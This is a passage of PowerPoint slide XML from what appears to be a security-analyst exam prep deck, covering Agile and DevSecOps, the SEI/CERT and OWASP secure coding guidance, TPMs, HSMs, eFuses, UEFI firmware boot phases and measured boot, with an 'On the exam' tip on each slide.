                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security is integrated continuously through practices like adding security requirements to the backlog, security-focused user stories, and automated testing woven into each iteration, which supports DevSecOps and shifting security left.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because Agile's rapid, frequent releases mean vulnerabilities can be introduced and remediated quickly, so security controls such as automated scanning must be embedded in the pipeline to keep pace with continuous deployment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to identify Agile as iterative and sprint-based, to associate it with continuous/automated security testing and DevSecOps, and to compare it against the Waterfall model.</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551</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Agile Model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g_33bf1bcabd.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1568802" y="1783080"/>
            <a:ext cx="9051348" cy="4434840"/>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552</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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BEST CODING PRACTICES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SEI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The Software Engineering Institute (SEI) at Carnegie Mellon University is a federally funded research center that produces widely referenced software security and process guidance, including the CERT secure coding standards.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its Top 10 Secure Coding Practices distill defensive principles such as validating all input, heeding compiler warnings, keeping designs simple, defaulting deny, adhering to least privilege, and practicing defense in depth into actionable rules for developers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these practices give an authoritative baseline for evaluating whether code and development processes reduce vulnerabilities, which is useful when reviewing findings or recommending remediation to development teams.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize SEI/CERT as an authoritative source of secure coding standards and its Top 10 Secure Coding Practices as a reference for secure development, alongside OWASP.</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553</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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BEST CODING PRACTICES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SEI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Top ten practices - https://www.securecoding.cert.org/confluence/display/seccode/Top+10+Secure+Coding+Practices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554</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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BEST CODING PRACTICES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OWASP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The Open Worldwide Application Security Project (OWASP) is a nonprofit community that publishes free, vendor-neutral resources on application security, most notably the OWASP Top 10 list of the most critical web application risks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its Secure Coding Practices Quick Reference Guide organizes defensive controls into sections, with input validation being foundational because unvalidated input is the root of injection, cross-site scripting, and many other attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because OWASP provides a common language and prioritized checklist for classifying web vulnerabilities, guiding scan interpretation, and recommending concrete fixes such as strict input validation and output encoding.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frequently references the OWASP Top 10 and secure coding guidance, especially input validation as the primary defense against injection and XSS.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555</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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BEST CODING PRACTICES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OWASP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https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  TOC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Input validation section</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556</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Trusted Platform Module (TPM)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A Trusted Platform Module (TPM) is a dedicated, tamper-resistant cryptographic chip (often implemented as a system-on-chip) built into a device's motherboard to generate, store, and manage cryptographic keys and support hardware-based trust.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It contains persistent memory holding the endorsement key (EK) that uniquely identifies the chip and the storage root key (SRK), plus versatile memory holding Platform Configuration Registers (PCRs) that store measurements of boot components, attestation identity keys (AIKs) used to prove system state, and storage keys that protect other keys.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  TPMs enable full-disk encryption binding (as with BitLocker), secure boot integrity, and remote attestation of a platform's health.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because the TPM anchors hardware root of trust, so keys and boot measurements resist software-based theft and tampering, strengthening endpoint and data protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know the TPM as a motherboard-bound chip and be able to match its components, EK, SRK, PCRs, and AIKs, to their roles in key storage, integrity measurement, and attestation.</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557</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Trusted Platform Module (TPM)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TPM chip</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  System-on-chip (SoC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stores cryptographic keys and the functionality to deal with them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Persistent memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Endorsement key (EK)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Storage root key (SRK)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Versatile memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Platform Configuration Registers (PCRs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Attestation Identity Keys (AIKs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Storage keys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558</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Hardware Security Module (HSM)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A Hardware Security Module (HSM) is a dedicated, tamper-resistant device that generates, stores, and manages cryptographic keys and performs cryptographic operations in a physically isolated, high-assurance environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Unlike a TPM, an HSM is not bound to a single motherboard and typically takes the form of a removable card, USB device, or network-attached appliance, allowing it to serve many systems and scale to high transaction volumes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is used for high-value functions such as certificate authority key protection, payment processing, and bulk encryption, often meeting FIPS 140-2/140-3 validation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because an HSM keeps the most sensitive keys off general-purpose systems, so even a fully compromised host cannot extract the private keys the HSM guards.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to distinguish an HSM (removable/standalone, scalable, not motherboard-bound) from a TPM (fixed to one motherboard) as hardware roots of trust for key management.</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559</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Hardware Security Module (HSM)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Not bound to a motherboard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Removable card or device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560</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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eFuse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An eFuse is a microscopic, one-time-programmable nonvolatile bit built into a chip that, once burned or set to 1, physically cannot be reset, making its state permanent and tamper-evident.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Manufacturers use banks of eFuses to permanently disable functionality such as debug or manufacturing-test interfaces, record configuration or version data, and store immutable values like device identifiers or cryptographic keys.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because a set eFuse cannot be reverted, it can enforce anti-rollback and lock a device into a trusted configuration after production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because eFuses provide a hardware-enforced, irreversible security state that resists software attacks, supporting secure boot chains and preventing downgrade or re-enabling of disabled features.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize the eFuse as a one-time-programmable, irreversible hardware bit used to permanently disable features or store immutable keys and configuration.</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561</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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eFuse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Nonvolatile bit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Once set to 1, cannot be changed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Useful to permanently disable functionality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Manufacturing tests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Useful to permanently store data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cryptographic keys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562</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware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Firmware is low-level software burned into a hardware chip that controls how a device initializes and operates, sitting between the physical hardware and higher-level software and being comparatively difficult to change.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Modern systems use the Unified Extensible Firmware Interface (UEFI) in place of legacy BIOS, and its boot process moves through defined phases: Security (SEC), Pre-EFI Initialization (PEI), Driver Execution Environment (DXE), Boot Device Select (BDS), Transient System Load (TSL), and Runtime (RT).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  UEFI adds capabilities such as Secure Boot, larger disk support, and a pre-boot environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because firmware runs before the operating system and its defenses, so a compromise, such as a bootkit or malicious UEFI implant, is stealthy, persistent, and extremely difficult to detect or remove.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know firmware as chip-resident low-level software and be able to place the UEFI boot phases (SEC, PEI, DXE, BDS, TSL, RT) in order and explain why firmware-level compromise is high impact.</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563</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware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Software that’s burned into hardware (chip)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Difficult to change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564</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware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Unified Extensible Firmware Interface (UEFI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Security Phase (SEC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Pre-EFI Initialization (PEI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Driver Execution Environment (DXE)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Boot Device Select (BDS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Transient System Load (TSL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Runtime (RT)</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565</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware Security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Firmware security protects the low-level code that runs before the operating system, using integrity verification and controlled update mechanisms to keep the boot chain trustworthy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Measured boot with attestation calculates cryptographic hashes of each component as it loads rather than only checking digital signatures, stores those hashes (typically in TPM PCRs), and securely reports them to a management or attestation station that decides whether the platform is in a known-good state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trusted firmware updates provide a built-in ability to download, cryptographically verify, and safely swap firmware images, often using dual banks so a failed or malicious write does not leave the device unbootable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these controls detect firmware tampering and prevent bricking, closing a stealthy persistence avenue that attackers exploit below the operating system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing measured boot and attestation (hashing plus remote reporting) from signature-based secure boot, and recognizing verified, resilient firmware updates as a defense against firmware-level attacks.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566</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TRUSTED HARDWARE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Firmware Security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Measured boot and attestation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
